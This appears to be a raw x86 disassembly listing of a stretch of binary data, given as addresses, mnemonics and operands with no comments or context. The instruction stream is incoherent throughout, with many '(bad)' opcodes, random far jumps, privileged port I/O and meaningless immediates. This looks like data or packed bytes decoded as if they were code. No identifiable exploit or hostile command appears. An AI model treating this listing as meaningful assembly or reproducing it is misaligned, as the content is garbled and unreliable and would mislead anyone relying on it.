  4205bc:	sbb    BYTE PTR [edx-0x685fb343],dl
  4205c2:	pop    esi
  4205c3:	jno    0x420548
  4205c5:	push   0x6b
  4205c7:	leave  
  4205c8:	mov    ds:0xc9292f99,eax
  4205cd:	push   ebp
  4205ce:	std    
  4205cf:	inc    ebx
  4205d0:	ds inc esp
  4205d2:	cdq    
  4205d3:	in     al,dx
  4205d4:	sbb    al,0xac
  4205d6:	pusha  
  4205d7:	loop   0x4205ae
  4205d9:	pusha  
  4205da:	cmp    al,0x5d
  4205dc:	mov    esp,0xc29c566d
  4205e1:	popf   
  4205e2:	lahf   
  4205e3:	sbb    eax,DWORD PTR [eax]
  4205e5:	and    ebx,0xffffffbf
  4205e8:	push   edi
  4205e9:	xor    eax,0xfe52b8b7
  4205ee:	mov    WORD PTR [edx+0x48],fs
  4205f1:	and    DWORD PTR [ecx+0x3b71f241],eax
  4205f7:	loop   0x42064b
  4205f9:	je     0x42065d
  4205fb:	xchg   ebp,eax
  4205fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205fe:	mov    WORD PTR [esi-0x6d156ef5],?
  420604:	rcr    BYTE PTR [esi+0x39e7ba37],cl
  42060a:	pop    ds
  42060b:	aas    
  42060c:	adc    BYTE PTR [ebx],0xf8
  42060f:	pop    ebp
  420610:	push   ebx
  420611:	std    
  420612:	adc    esp,DWORD PTR [ebx-0x3af0c559]
  420618:	test   eax,0x529b6264
  42061d:	sbb    BYTE PTR [edi+esi*4+0x11],0xe8
  420622:	into   
  420623:	cdq    
  420624:	ret    0xf62d
  420627:	jns    0x420659
  420629:	adc    al,0x5c
  42062b:	in     eax,dx
  42062c:	sbb    DWORD PTR [edi],eax
  42062e:	xchg   ecx,eax
  42062f:	push   0xffffffcf
  420631:	adc    DWORD PTR [ebx-0xe8e0be2],eax
  420637:	cmp    al,0x13
  420639:	inc    edx
  42063a:	sub    DWORD PTR [ebx-0x6ba68de0],edx
  420640:	adc    DWORD PTR [ebx],edx
  420642:	mov    ecx,0xa245281a
  420647:	or     DWORD PTR [eax+0x14],0x17
  42064b:	inc    ebp
  42064c:	push   cs
  42064d:	lea    edi,[edx]
  42064f:	mov    dl,0xad
  420651:	jmp    0x420645
  420653:	push   eax
  420654:	addr16 push ebx
  420656:	and    DWORD PTR [esi-0x8ad234],esp
  42065c:	clc    
  42065d:	dec    al
  42065f:	in     eax,0x4f
  420661:	stos   BYTE PTR es:[edi],al
  420662:	xor    al,0xf1
  420664:	push   ss
  420665:	inc    ebp
  420666:	lock add ax,0x825e
  42066b:	add    eax,0x1ea33884
  420670:	cwde   
  420671:	adc    al,0xf9
  420673:	inc    edx
  420674:	nop
  420675:	sub    ebp,esp
  420677:	addr16 sbb ebp,esi
  42067a:	(bad)  
  42067b:	mov    cl,0x12
  42067d:	mov    esi,0x9ad10d86
  420682:	aad    0x2c
  420684:	sub    esp,edx
  420686:	fild   DWORD PTR [ecx-0x64]
  420689:	inc    ecx
  42068a:	sbb    DWORD PTR [esi],0x5e9dbfb9
  420690:	pop    ds
  420691:	shl    BYTE PTR [ebx+0x42f786ab],1
  420697:	cmp    BYTE PTR [esi+0x4f7de681],bl
  42069d:	inc    edi
  42069e:	jecxz  0x420641
  4206a0:	repnz mul DWORD PTR [eax]
  4206a3:	adc    DWORD PTR [edi-0x1eab5bc],ebx
  4206a9:	mov    bh,0xbd
  4206ab:	aad    0x64
  4206ad:	adc    BYTE PTR [bp+0x37],bh
  4206b1:	xor    DWORD PTR [eax-0xc8d4d3f],ebp
  4206b7:	inc    esp
  4206b8:	sar    ch,0x23
  4206bb:	mov    al,0xab
  4206bd:	add    eax,0xc49c2757
  4206c2:	in     eax,dx
  4206c3:	dec    ebx
  4206c4:	sub    al,0x17
  4206c6:	jns    0x420718
  4206c8:	shl    DWORD PTR [edi+0x4994e9b3],1
  4206ce:	out    dx,al
  4206cf:	dec    ecx
  4206d0:	adc    ah,cl
  4206d2:	(bad)  
  4206d3:	fld    st(1)
  4206d5:	xor    bl,cl
  4206d7:	lock cmp ah,BYTE PTR [edx+edi*4]
  4206db:	push   ds
  4206dc:	les    ebx,FWORD PTR [ebp+0x17a66205]
  4206e2:	das    
  4206e3:	rol    BYTE PTR [ebp-0x5ef9c484],cl
  4206e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206ea:	fwait
  4206eb:	mov    ds:0x76189c62,eax
  4206f0:	test   DWORD PTR [esi+0x36],edi
  4206f3:	jo     0x4206b7
  4206f5:	fwait
  4206f6:	mov    ss,esi
  4206f8:	gs icebp 
  4206fa:	xchg   edi,eax
  4206fb:	mov    ebx,esp
  4206fd:	dec    esp
  4206fe:	call   0xe87d:0xe8736270
  420705:	scas   eax,DWORD PTR es:[edi]
  420706:	popa   
  420707:	in     al,dx
  420708:	ja     0x420729
  42070a:	dec    BYTE PTR ds:0x42c9e2d8
  420710:	and    ch,bh
  420712:	mov    edx,0x4965e2a2
  420717:	popf   
  420718:	sub    al,0x38
  42071a:	xchg   dx,ax
  42071c:	popa   
  42071d:	je     0x42077a
  42071f:	pop    edx
  420720:	outs   dx,BYTE PTR ds:[esi]
  420721:	imul   edx,DWORD PTR [ebx-0x1af42fef],0x23
  420728:	ror    BYTE PTR [ebx+0x5f],cl
  42072b:	push   es
  42072c:	and    edx,esp
  42072e:	mov    ds,WORD PTR [ebp-0xe215053]
  420734:	sbb    DWORD PTR [edi+ebp*8-0x208b2098],edi
  42073b:	mov    ecx,0x9dc89a6f
  420740:	outs   dx,BYTE PTR ds:[esi]
  420741:	mov    edi,0xb3b2b0d4
  420746:	not    edi
  420748:	out    dx,al
  420749:	scas   al,BYTE PTR es:[edi]
  42074a:	bts    DWORD PTR [ecx],0x5f
  42074e:	xlat   BYTE PTR ds:[ebx]
  42074f:	inc    ebx
  420750:	es dec esi
  420752:	and    al,0xfd
  420754:	pop    ecx
  420755:	dec    esi
  420756:	rol    DWORD PTR [ebx-0x5a149ff1],0x4b
  42075d:	jo     0x42077b
  42075f:	adc    al,0xec
  420761:	mov    ds:0x36539c1c,eax
  420766:	adc    eax,eax
  420768:	lea    esi,[ebp-0x7f]
  42076b:	cmp    eax,0x60af0002
  420770:	dec    ebx
  420771:	cmp    esi,DWORD PTR [esi-0x4c]
  420774:	add    DWORD PTR [eax],eax
  420776:	jmp    0x2aec:0x9f80aab0
  42077d:	pop    es
  42077e:	jnp    0x420701
  420780:	test   eax,0x44f5dfd8
  420785:	sbb    esi,edi
  420787:	mov    bl,BYTE PTR [eax+0x7c]
  42078a:	in     al,0xa1
  42078c:	int3   
  42078d:	retf   
  42078e:	js     0x420790
  420790:	jne    0x42080b
  420792:	loop   0x4207de
  420794:	lock stc 
  420796:	outs   dx,DWORD PTR ds:[si]
  420798:	mov    gs,WORD PTR [esi-0x351e3c4c]
  42079e:	jno    0x42076f
  4207a0:	xchg   edi,eax
  4207a1:	dec    ebx
  4207a2:	push   eax
  4207a3:	mov    edx,DWORD PTR [eax+0x175ac96b]
  4207a9:	and    ebx,edi
  4207ab:	or     ah,dl
  4207ad:	push   ds
  4207ae:	mov    ch,0x65
  4207b0:	scas   al,BYTE PTR es:[edi]
  4207b1:	adc    eax,0xdc50e022
  4207b6:	cs and eax,0x47b739bc
  4207bc:	add    DWORD PTR [edi-0x35],ebx
  4207bf:	data16 jle 0x4207a7
  4207c2:	stos   DWORD PTR es:[edi],eax
  4207c3:	cmc    
  4207c4:	jmp    DWORD PTR [edi]
  4207c6:	leave  
  4207c7:	xor    ebp,ebx
  4207c9:	lock or al,0x47
  4207cc:	jp     0x4207ad
  4207ce:	push   ebx
  4207cf:	push   0x861ec9fa
  4207d4:	pop    ecx
  4207d5:	lahf   
  4207d6:	xor    al,0x3b
  4207d8:	call   0x42e7:0x824eaa1d
  4207df:	or     BYTE PTR [eax+0x9fccb3a],dh
  4207e5:	jb     0x4207ec
  4207e7:	inc    ebx
  4207e8:	adc    al,0xca
  4207ea:	xor    BYTE PTR [esi+0x198a58b9],ch
  4207f0:	retf   0x88c
  4207f3:	out    0xe2,eax
  4207f5:	inc    edx
  4207f6:	cld    
  4207f7:	sub    cl,bl
  4207f9:	jae    0x420790
  4207fb:	and    eax,0x579ac435
  420800:	mov    ds:0x6019145b,eax
  420805:	mov    ch,0x3e
  420807:	jmp    FWORD PTR [ecx-0x54b39d66]
  42080d:	lea    ebp,[eax-0x75]
  420810:	repnz cmp bl,dh
  420813:	xor    al,0xb6
  420815:	mov    bh,0x27
  420817:	(bad)
  42081b:	or     esi,DWORD PTR [edi+0x11]
  42081e:	pusha  
  42081f:	les    esi,FWORD PTR [ebp-0x50]
  420822:	lds    edi,FWORD PTR [esi+0x140745a4]
  420828:	add    eax,DWORD PTR [ecx]
  42082a:	(bad)  
  42082c:	jmp    0xb0f:0xc344280a
  420833:	add    eax,edx
  420835:	dec    edi
  420836:	pop    edi
  420837:	xlat   BYTE PTR ds:[ebx]
  420838:	dec    edi
  420839:	mov    ebp,0x85c0b3be
  42083e:	aam    0xcf
  420840:	sbb    bl,BYTE PTR [eax]
  420842:	pop    edi
  420843:	jnp    0x4207da
  420845:	mov    ah,0xbf
  420847:	sbb    ebx,DWORD PTR [edi+0xecad43c]
  42084d:	mov    bl,ah
  42084f:	mov    esi,0xaf4ef986
  420854:	cmp    eax,0x6324d2b
  420859:	xor    esp,ecx
  42085b:	retf   0x1f22
  42085e:	bound  esp,QWORD PTR [ebx+ebp*4]
  420861:	les    eax,FWORD PTR [ecx+esi*4-0x4f]
  420865:	ss addr16 inc ebx
  420868:	test   ebx,ebx
  42086a:	jmp    0x6dfb7a92
  42086f:	lods   eax,DWORD PTR ds:[esi]
  420870:	fimul  DWORD PTR [esi]
  420872:	push   ebx
  420873:	sbb    bh,ch
  420875:	nop
  420876:	(bad)  
  420877:	ins    DWORD PTR es:[edi],dx
  420878:	jge    0x4207fc
  42087a:	pop    ss
  42087b:	div    BYTE PTR [ecx]
  42087d:	jecxz  0x4208e6
  42087f:	in     eax,0xeb
  420881:	icebp  
  420882:	mov    ah,0xac
  420884:	pop    ebx
  420885:	aam    0x94
  420887:	add    al,0xf1
  420889:	and    ch,0x3f
  42088c:	inc    ebx
  42088d:	add    DWORD PTR [edx+0x4b1f27c8],eax
  420893:	jb     0x42090e
  420895:	in     eax,dx
  420896:	fadd   QWORD PTR [eax]
  420898:	inc    ecx
  420899:	scas   eax,DWORD PTR es:[edi]
  42089a:	adc    edi,DWORD PTR [eax+0x2c4fef1b]
  4208a0:	mov    ah,0xbd
  4208a2:	push   ss
  4208a3:	push   DWORD PTR [esi+0x495c2fff]
  4208a9:	arpl   ax,cx
  4208ab:	out    0x64,al
  4208ad:	add    esi,DWORD PTR [ebp-0x9]
  4208b0:	cmp    eax,0xe77715d5
  4208b5:	cmp    BYTE PTR [ebx+0x3e],dl
  4208b8:	pop    edi
  4208b9:	ret    
  4208ba:	cmp    edi,DWORD PTR [esi+0x36]
  4208bd:	mov    ds:0x2f0dfbcd,al
  4208c2:	std    
  4208c3:	adc    eax,0x9dcd7a95
  4208c8:	inc    esi
  4208c9:	out    dx,eax
  4208ca:	aaa    
  4208cb:	inc    edx
  4208cc:	add    esi,DWORD PTR [ecx-0x2]
  4208cf:	inc    esi
  4208d0:	jecxz  0x4208e0
  4208d2:	sahf   
  4208d3:	mov    ebp,0xb4c7c98d
  4208d8:	repnz pop ebx
  4208da:	push   0xacdde934
  4208df:	fild   DWORD PTR ds:0x388d6f1a
  4208e5:	sub    DWORD PTR [edx+0x693d1f17],0x78bcf647
  4208ef:	xchg   edx,eax
  4208f0:	mov    bh,0x1e
  4208f2:	call   FWORD PTR [esi]
  4208f4:	into   
  4208f5:	mov    edx,DWORD PTR [eax-0x2d]
  4208f8:	iret   
  4208f9:	push   es
  4208fa:	cwde   
  4208fb:	mov    cl,0x40
  4208fd:	jnp    0x420970
  4208ff:	sbb    ch,ch
  420901:	ror    BYTE PTR [ecx-0x1b958437],0x5e
  420908:	(bad)  
  420909:	cwde   
  42090a:	loop   0x4208ec
  42090c:	bound  ecx,QWORD PTR [eax]
  42090e:	xor    al,0xac
  420910:	dec    eax
  420911:	rcl    BYTE PTR [ebx-0x2f4faf37],0xd0
  420918:	dec    edi
  420919:	pop    edi
  42091a:	ja     0x42092b
  42091c:	jbe    0x420958
  42091e:	mov    ebx,0x3f2aa6ea
  420923:	xchg   ebx,eax
  420924:	adc    esp,DWORD PTR [edx-0x2b]
  420927:	add    ch,dh
  420929:	mov    esi,0x71535aa0
  42092e:	lahf   
  42092f:	and    bh,BYTE PTR [edi+0x2bfe0814]
  420935:	jns    0x4208b9
  420937:	rcr    BYTE PTR [edi],0x4e
  42093a:	or     ah,BYTE PTR [ecx+0x37483b1b]
  420940:	jmp    0xd2bb855e
  420945:	cld    
  420946:	call   FWORD PTR [edi+eax*2]
  420949:	pop    edi
  42094a:	fs xchg ebp,eax
  42094c:	(bad)  
  42094d:	out    dx,al
  42094e:	les    edx,FWORD PTR ss:[edi+0x4ae47713]
  420955:	mov    eax,0x6c7ad847
  42095a:	xchg   BYTE PTR [esi-0x34],dh
  42095d:	sub    eax,0x432e28af
  420962:	mov    ds:0x46621057,al
  420967:	jl     0x420999
  420969:	shl    BYTE PTR [edx],cl
  42096b:	xlat   BYTE PTR ds:[ebx]
  42096c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42096d:	add    eax,0x1afccac6
  420972:	cdq    
  420973:	sbb    al,0xd1
  420975:	cwde   
  420976:	xchg   bh,cl
  420978:	mov    al,0xe7
  42097a:	pop    esp
  42097b:	or     eax,DWORD PTR [ecx-0x13]
  42097e:	xor    DWORD PTR [ebx-0x3e1fc2f4],edi
  420984:	and    ah,bl
  420986:	jmp    0x420970
  420988:	sti    
  420989:	xchg   esi,edi
  42098b:	ss repnz inc ecx
  42098e:	inc    eax
  42098f:	mov    eax,ds:0x65d2a24f
  420994:	xchg   ebp,eax
  420995:	dec    esp
  420996:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420998:	inc    esp
  420999:	int    0x88
  42099b:	pop    ecx
  42099c:	mov    edx,DWORD PTR [edi+ecx*1]
  42099f:	push   es
  4209a0:	jmp    DWORD PTR [esi+0x43ff3a7b]
  4209a6:	jg     0x420a00
  4209a8:	cmc    
  4209a9:	mov    ds:0xd5aea13d,al
  4209ae:	dec    ebp
  4209af:	in     eax,0x8
  4209b1:	shl    DWORD PTR [esi+ecx*1],cl
  4209b4:	icebp  
  4209b5:	mov    ebp,0xff6c5d08
  4209ba:	xchg   ebx,eax
  4209bb:	push   0xed527716
  4209c0:	xlat   BYTE PTR ds:[ebx]
  4209c1:	xchg   ebp,eax
  4209c2:	imul   edx,ecx,0x2d
  4209c5:	mov    ds:0xa66ccee9,al
  4209cb:	or     ch,BYTE PTR [edx]
  4209cd:	aam    0x36
  4209cf:	std    
  4209d0:	and    edi,DWORD PTR [esi+ebx*2+0x61a7c96b]
  4209d7:	pusha  
  4209d8:	adc    ch,BYTE PTR [edx]
  4209da:	popf   
  4209db:	dec    edi
  4209dc:	je     0x4209a8
  4209de:	les    ecx,FWORD PTR [ecx+0x65]
  4209e1:	dec    esi
  4209e2:	sub    edi,0x41
  4209e5:	add    esi,esp
  4209e7:	push   esp
  4209e8:	xor    al,BYTE PTR [ebp+0x61]
  4209eb:	xor    DWORD PTR [eax+esi*1-0x7c35f9a3],0xb447848e
  4209f6:	push   esp
  4209f7:	scas   al,BYTE PTR es:[edi]
  4209f8:	clc    
  4209f9:	mov    eax,ds:0x4d8fe4c2
  4209fe:	or     eax,0x69dd652f
  420a03:	pop    ebx
  420a04:	pusha  
  420a05:	mov    al,ds:0xbf813754
  420a0a:	out    dx,eax
  420a0b:	push   esi
  420a0c:	mov    WORD PTR [edx+ebp*1-0x28009286],gs
  420a13:	jno    0x4209fa
  420a15:	bound  eax,QWORD PTR [eax-0x66]
  420a18:	or     edi,DWORD PTR [eax-0x73]
  420a1b:	cmp    al,0x61
  420a1d:	inc    edx
  420a1e:	aas    
  420a1f:	push   edx
  420a20:	fnsave [ecx]
  420a22:	mov    ebp,0x7dbe8310
  420a27:	mov    dh,0x39
  420a29:	jbe    0x420a2b
  420a2b:	push   ss
  420a2c:	jnp    0x420a5f
  420a2e:	ins    BYTE PTR es:[edi],dx
  420a2f:	scas   eax,DWORD PTR es:[edi]
  420a30:	(bad)  
  420a31:	push   ebp
  420a32:	les    ecx,FWORD PTR [ecx-0x3]
  420a35:	fs or  eax,0x4df970d1
  420a3b:	sbb    eax,0x45ebefae
  420a40:	daa    
  420a41:	inc    edi
  420a42:	sti    
  420a43:	xchg   edi,eax
  420a44:	sub    DWORD PTR [esi+0x35],eax
  420a47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a48:	xchg   edx,eax
  420a49:	das    
  420a4a:	retf   0x20e2
  420a4d:	sub    cl,ch
  420a4f:	out    0x72,al
  420a51:	je     0x420abd
  420a53:	inc    esi
  420a54:	xchg   ebx,eax
  420a55:	fsubr  st,st(3)
  420a57:	jae    0x4209e8
  420a59:	jecxz  0x420a21
  420a5b:	adc    al,0xa7
  420a5d:	and    ah,BYTE PTR fs:[edx]
  420a60:	test   DWORD PTR [edx],ebx
  420a62:	jns    0x420a74
  420a64:	pop    edx
  420a65:	gs ror edi,1
  420a68:	cmp    al,0x46
  420a6a:	add    eax,0x4f61a676
  420a6f:	jae    0x420ac8
  420a71:	(bad)  
  420a72:	jmp    0x420ad7
  420a74:	call   0xa79615ab
  420a79:	fsub   DWORD PTR [edx+0x8]
  420a7c:	add    BYTE PTR [ecx+edx*4],dl
  420a7f:	sub    al,0x2a
  420a81:	mov    es,ebx
  420a83:	push   edx
  420a84:	pop    ebx
  420a85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a86:	sbb    BYTE PTR [edx+edx*2],bh
  420a89:	(bad)  
  420a8a:	jb     0x420ab3
  420a8c:	sbb    esi,DWORD PTR [eax+0x637a6668]
  420a92:	int    0xa6
  420a94:	les    esp,FWORD PTR [edx+0x46ee4e11]
  420a9a:	push   esp
  420a9b:	push   cs
  420a9c:	push   eax
  420a9d:	ins    BYTE PTR es:[edi],dx
  420a9e:	(bad)  ds:[eax+0x1296f96c]
  420aa5:	mov    bh,0xe0
  420aa7:	lds    ecx,FWORD PTR [eax+0x1]
  420aaa:	in     eax,0xb7
  420aac:	mov    edx,0x774553cd
  420ab1:	pop    esp
  420ab2:	xchg   ebp,eax
  420ab3:	push   esi
  420ab4:	aaa    
  420ab5:	mov    ?,WORD PTR [ecx+edi*8-0xc]
  420ab9:	stos   BYTE PTR es:[edi],al
  420aba:	(bad)  
  420abb:	sti    
  420abc:	add    bl,al
  420abe:	jnp    0x420afb
  420ac0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ac1:	sbb    BYTE PTR [ebx+0x4c],dh
  420ac4:	imul   ebp,DWORD PTR [edi],0x5a
  420ac7:	push   esi
  420ac8:	push   edi
  420ac9:	test   DWORD PTR [esi],edx
  420acb:	ins    DWORD PTR es:[edi],dx
  420acc:	dec    ecx
  420acd:	sar    BYTE PTR [ecx+ebx*8-0x14fc2a1c],1
  420ad4:	jmp    0x268f:0xd11ec155
  420adb:	rcl    BYTE PTR [ebp-0x46682895],0x70
  420ae2:	mov    BYTE PTR [edx-0x271cb4a6],cl
  420ae8:	lock adc eax,0x58b57340
  420aee:	leave  
  420aef:	sets   ah
  420af2:	into   
  420af3:	retf   
  420af4:	push   ds
  420af5:	scas   eax,DWORD PTR es:[edi]
  420af6:	add    BYTE PTR [edx+0x5a],0xfb
  420afa:	fistp  QWORD PTR [edx]
  420afc:	lods   eax,DWORD PTR ds:[esi]
  420afd:	push   eax
  420afe:	mov    WORD PTR [edi+ebx*8],ds
  420b01:	jg     0x420b35
  420b03:	(bad)  
  420b05:	mov    ebp,0x56332ad0
  420b0a:	mov    al,0x5f
  420b0c:	jp     0x420ada
  420b0e:	imul   ebp,edx,0xffffff88
  420b11:	xchg   ecx,eax
  420b12:	cmp    al,BYTE PTR [edi+ebx*4+0x68988f2e]
  420b19:	xchg   ebx,eax
  420b1a:	xchg   BYTE PTR [ebp-0x8a6116d],ah
  420b20:	mov    eax,DWORD PTR [ebp+0x79]
  420b23:	sbb    bl,BYTE PTR [ecx+0x533ba667]
  420b29:	leave  
  420b2a:	das    
  420b2b:	test   ah,bh
  420b2d:	cwde   
  420b2e:	mov    ebx,0x96064faa
  420b33:	mul    DWORD PTR [esi+0xf]
  420b36:	xchg   ebx,eax
  420b37:	cmp    al,0x90
  420b39:	mov    ebp,0xad5c7fdc
  420b3e:	icebp  
  420b3f:	mov    ecx,0x7b6c453a
  420b44:	fwait
  420b45:	pusha  
  420b46:	fdivp  st(6),st
  420b48:	lahf   
  420b49:	jmp    0x8d7:0x41b75678
  420b50:	cld    
  420b51:	push   esi
  420b52:	gs or  eax,0x74253ae2
  420b58:	xlat   BYTE PTR ds:[ebx]
  420b59:	dec    ebp
  420b5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b5b:	adc    dh,BYTE PTR [edi]
  420b5d:	dec    edx
  420b5e:	shl    BYTE PTR [edx],cl
  420b60:	or     al,0x18
  420b62:	(bad)  
  420b63:	test   DWORD PTR [ecx-0x1c4ec2be],0x8eafb3b6
  420b6d:	(bad)
  420b70:	push   edx
  420b71:	cs cmp edi,ecx
  420b74:	xor    al,0xd1
  420b76:	scas   al,BYTE PTR es:[edi]
  420b77:	xor    esp,0x1beed124
  420b7d:	adc    bl,cl
  420b7f:	mov    ecx,0x8f4edbe5
  420b84:	gs inc eax
  420b86:	in     eax,dx
  420b87:	ror    ebp,0x1
  420b8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b8b:	sub    DWORD PTR [esi+eiz*8-0xe0ca480],esi
  420b92:	mov    al,0x56
  420b94:	or     DWORD PTR [ecx-0x52],esp
  420b97:	jbe    0x420b7e
  420b99:	lods   al,BYTE PTR ds:[esi]
  420b9a:	inc    edx
  420b9b:	imul   ebp,DWORD PTR [eax-0x38],0xffffff93
  420b9f:	inc    ebx
  420ba0:	js     0x420b90
  420ba2:	int    0x32
  420ba4:	fs int 0xb2
  420ba7:	mov    esp,0x1f097fe9
  420bac:	xor    ecx,DWORD PTR [esi-0x7c6a21e1]
  420bb2:	jp     0x420c06
  420bb4:	push   edi
  420bb5:	pop    ecx
  420bb6:	mov    eax,ds:0xf5baa3b7
  420bbb:	xchg   edi,eax
  420bbc:	addr16 int3 
  420bbe:	pop    es
  420bbf:	add    edi,DWORD PTR [edi]
  420bc1:	xchg   eax,esp
  420bc3:	and    eax,0xbbfe78bf
  420bc8:	fdivrp st(2),st
  420bca:	popf   
  420bcb:	inc    esi
  420bcc:	xchg   ecx,eax
  420bcd:	cmp    DWORD PTR [ecx-0x1442cdf],eax
  420bd3:	fsub   QWORD PTR [edx]
  420bd5:	icebp  
  420bd6:	push   edx
  420bd7:	dec    edx
  420bd8:	mov    bh,0x7f
  420bda:	sub    ecx,esp
  420bdc:	push   cs
  420bdd:	outs   dx,DWORD PTR ds:[esi]
  420bde:	pop    edx
  420bdf:	and    DWORD PTR [edi-0x67],edx
  420be2:	mov    edi,0xb7a6b150
  420be7:	mov    bl,0x2f
  420be9:	or     eax,0x1f09c16a
  420bee:	pop    esi
  420bef:	or     bl,bl
  420bf1:	fbld   TBYTE PTR [ebp-0x37]
  420bf4:	sub    bh,BYTE PTR [ebp+0x76]
  420bf7:	sub    BYTE PTR [eax-0x40ec1d07],bh
  420bfd:	stos   DWORD PTR es:[edi],eax
  420bfe:	sbb    al,0x49
  420c00:	cwde   
  420c01:	aas    
  420c02:	sub    al,0xfb
  420c04:	or     ah,ah
  420c06:	es pop ss
  420c08:	jecxz  0x420c1b
  420c0a:	call   0xd9908f91
  420c0f:	sub    bh,al
  420c11:	adc    DWORD PTR [eax],0x749d9230
  420c17:	imul   edi,DWORD PTR [edi+0x5e0e3184],0x7b
  420c1e:	mov    ah,0x7b
  420c20:	pop    ds
  420c21:	xor    ebp,edx
  420c23:	sbb    BYTE PTR [edi+0x77],ch
  420c26:	and    cl,0x18
  420c29:	test   BYTE PTR [edx],0x70
  420c2c:	jge    0x420c8b
  420c2e:	lock cdq 
  420c30:	xchg   DWORD PTR [eax+0x5e024d0],esi
  420c36:	add    bl,BYTE PTR [ebx]
  420c38:	mov    dh,0x1b
  420c3a:	stos   BYTE PTR es:[edi],al
  420c3b:	cdq    
  420c3c:	cmc    
  420c3d:	inc    esp
  420c3e:	mov    cl,0xdb
  420c40:	pop    edx
  420c41:	and    DWORD PTR [edx-0x3558cb1],esi
  420c47:	in     al,0xe5
  420c49:	jo     0x420c79
  420c4b:	sti    
  420c4c:	xchg   esi,eax
  420c4d:	mov    ds:0x5f73df3a,eax
  420c52:	lods   al,BYTE PTR ds:[esi]
  420c53:	(bad)  
  420c55:	fbstp  TBYTE PTR [esi]
  420c57:	and    BYTE PTR [edx],bh
  420c59:	push   0x49628cb8
  420c5e:	out    dx,al
  420c5f:	cmp    eax,0x16b00233
  420c64:	test   DWORD PTR [esi],ebp
  420c66:	adc    eax,0x650e55b4
  420c6b:	adc    al,0x68
  420c6d:	inc    ebx
  420c6e:	add    edi,DWORD PTR [edi]
  420c70:	dec    edx
  420c71:	sub    ecx,ebx
  420c73:	adc    bl,dh
  420c75:	popf   
  420c76:	test   BYTE PTR [eax-0x45f83994],0x50
  420c7d:	loopne 0x420cf8
  420c7f:	ss hlt 
  420c81:	gs gs ffreep st(1)
  420c85:	xchg   edi,eax
  420c86:	pop    ds
  420c87:	je     0x420c37
  420c89:	sbb    ch,bh
  420c8b:	jp     0x420c44
  420c8d:	inc    esp
  420c8e:	call   0xd10e:0x44b21d99
  420c95:	mov    ebp,0x629c0524
  420c9a:	and    ebp,DWORD PTR [esi+ebp*8]
  420c9d:	jmp    0xa94e:0x64752aab
  420ca4:	ret    0x43e
  420ca7:	mov    ecx,0x4a3f6f12
  420cac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420cad:	mov    al,0xb3
  420caf:	xchg   ecx,eax
  420cb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420cb1:	repz popf 
  420cb3:	int3   
  420cb4:	(bad)  [ebx-0x72]
  420cb7:	dec    esi
  420cb8:	xor    al,0x40
  420cba:	jbe    0x420cc2
  420cbc:	push   esi
  420cbd:	bound  ecx,QWORD PTR [eax+0x7b]
  420cc0:	dec    ecx
  420cc1:	cmp    DWORD PTR [ebx-0x6b62844],esp
  420cc7:	outs   dx,DWORD PTR ds:[esi]
  420cc8:	jne    0x420c98
  420cca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ccb:	aas    
  420ccc:	xchg   ecx,edx
  420cce:	fbstp  TBYTE PTR ds:0x3bb7dd97
  420cd4:	cld    
  420cd5:	popa   
  420cd6:	jl     0x420d2c
  420cd8:	add    edi,DWORD PTR [edx]
  420cda:	push   edx
  420cdb:	push   edi
  420cdc:	int3   
  420cdd:	jmp    0xd1f43905
  420ce2:	icebp  
  420ce3:	test   DWORD PTR [bp+si],0x71f5fcc
  420cea:	or     ebp,DWORD PTR [ecx-0x5]
  420ced:	ins    BYTE PTR es:[edi],dx
  420cee:	(bad)  
  420cef:	fbld   TBYTE PTR [edi+eax*4-0x33061eb8]
  420cf6:	push   esi
  420cf7:	popf   
  420cf8:	mov    edi,cr1
  420cfb:	test   al,0xc0
  420cfd:	adc    ebp,edx
  420cff:	push   eax
  420d00:	cli    
  420d01:	aam    0x59
  420d03:	dec    esi
  420d04:	imul   eax,DWORD PTR [edx+0x5f1f84e6],0x2b
  420d0b:	fs loop 0x420d12
  420d0e:	in     eax,dx
  420d0f:	out    dx,al
  420d10:	adc    eax,0xff13f73b
  420d16:	dec    esi
  420d17:	and    edi,esp
  420d19:	aam    0x27
  420d1b:	push   esi
  420d1c:	js     0x420cbc
  420d1e:	xchg   edx,eax
  420d1f:	push   eax
  420d20:	jmp    0xd1a7:0xba650748
  420d27:	nop
  420d28:	mov    edi,0x13dd4388
  420d2d:	data16 not BYTE PTR [ebp+esi*4+0x6af2a69a]
  420d35:	jg     0x420d91
  420d37:	loope  0x420d45
  420d39:	xchg   ebx,eax
  420d3a:	push   esp
  420d3b:	test   DWORD PTR [ebx],esp
  420d3d:	fwait
  420d3e:	or     ah,BYTE PTR [esi]
  420d40:	(bad)  
  420d41:	jmp    0x420cd3
  420d43:	leave  
  420d44:	push   0xffffff97
  420d46:	dec    eax
  420d47:	cli    
  420d48:	sub    eax,DWORD PTR [ecx-0x6ce4361e]
  420d4e:	in     al,dx
  420d4f:	shl    BYTE PTR [esi+0x38fafcc5],1
  420d55:	fadd   st,st(6)
  420d57:	add    DWORD PTR [ecx-0x23eac4d9],0xb64a275d
  420d61:	mov    ds,WORD PTR ds:0x8342a756
  420d67:	test   DWORD PTR [ebx+0x1739035],ebx
  420d6d:	add    ebp,ebp
  420d6f:	sub    esi,DWORD PTR [edx]
  420d71:	or     eax,DWORD PTR [edx]
  420d73:	inc    esi
  420d74:	ds push ds
  420d76:	inc    edx
  420d77:	inc    edx
  420d78:	fwait
  420d79:	int    0x3c
  420d7b:	lods   eax,DWORD PTR ds:[esi]
  420d7c:	repz and DWORD PTR [esi+0x10ad75a4],0x51
  420d84:	mov    al,ss:0x284e09ab
  420d8a:	shl    DWORD PTR [eax-0x49],1
  420d8d:	mov    ebp,0xbb80cbfb
  420d92:	dec    edx
  420d93:	ss cmp ecx,DWORD PTR fs:[edi-0x2bff826b]
